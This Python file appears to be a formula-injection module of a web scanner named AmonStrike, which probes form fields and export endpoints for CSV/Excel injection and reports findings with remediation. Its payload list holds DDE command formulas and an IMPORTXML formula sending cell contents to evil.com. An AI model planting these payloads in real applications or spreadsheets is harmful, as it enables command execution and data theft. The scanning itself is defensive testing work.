"""AmonStrike — Formula/CSV Injection Module"""
from .base import BaseModule

FORMULA_PAYLOADS = [
    "=cmd|' /C calc'!A0",
    "=HYPERLINK(\"http://evil.com\",\"Click\")",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    "-cmd|' /C calc'!A0",
    "=1+1",
    "\x09=1+1",
    "\t=1+1",
    "=IMPORTXML(CONCAT(\"http://evil.com/?\",CONCATENATE(A2:E2)),\"//a\")",
]

CSV_FIELDS = ["name","username","title","comment","description","address","company"]

class FormulaInjectionModule(BaseModule):
    NAME        = "formula_injection"
    DESCRIPTION = "CSV/Excel formula injection — =cmd, =HYPERLINK, DDE"

    def run(self):
        self.log("Testing formula injection...")
        self._test_input_fields()
        self._test_export_endpoints()
        return self.result()

    def _test_input_fields(self):
        r0 = self.get("")
        if not r0: return
        for form in self.extract_forms(r0):
            for field in form.get("inputs",{}):
                if any(f in field.lower() for f in CSV_FIELDS):
                    data = dict(form["inputs"])
                    data[field] = "=1+1"
                    r = self.post(form.get("action",""), data=data)
                    if r and r.status_code in [200,201]:
                        # Check if reflected (sign of CSV export risk)
                        if "=1+1" in r.text or "2" in r.text:
                            self.add_finding(
                                title       = f"Formula Injection Risk — Field \'{field}\' Reflected",
                                severity    = "MEDIUM",
                                description = (
                                    f"Field \'{field}\' accepts and reflects formula-starting values. "
                                    "If this data is exported to CSV/Excel, formulas execute on open, "
                                    "enabling DDE attacks and data exfiltration."
                                ),
                                evidence    = f"Field: {field}\nPayload: =1+1\nReflected in response",
                                remediation = "Prefix all values with single quote in CSV exports. Strip leading =+-@ from user input.",
                                url=self.url, parameter=field, payload="=1+1", cve="CWE-1236",
                            )

    def _test_export_endpoints(self):
        for path in ["/api/export","/export","/api/download","/api/report","/download/csv"]:
            r = self.get(path)
            if not r or r.status_code == 404: continue
            ct = r.headers.get("Content-Type","").lower()
            if "csv" in ct or "excel" in ct or "spreadsheet" in ct:
                if any(r.text.startswith(c) for c in ["=","@","+"]):
                    self.add_finding(
                        title       = f"CSV Export Contains Unescaped Formula: {path}",
                        severity    = "HIGH",
                        description = "CSV export contains formula-starting characters from user data.",
                        evidence    = f"Path: {path}\nContent-Type: {ct}\nFirst chars: {r.text[:50]}",
                        remediation = "Quote all fields in CSV. Prefix = + - @ with single quote.",
                        url=self.url+path, cve="CWE-1236",
                    )
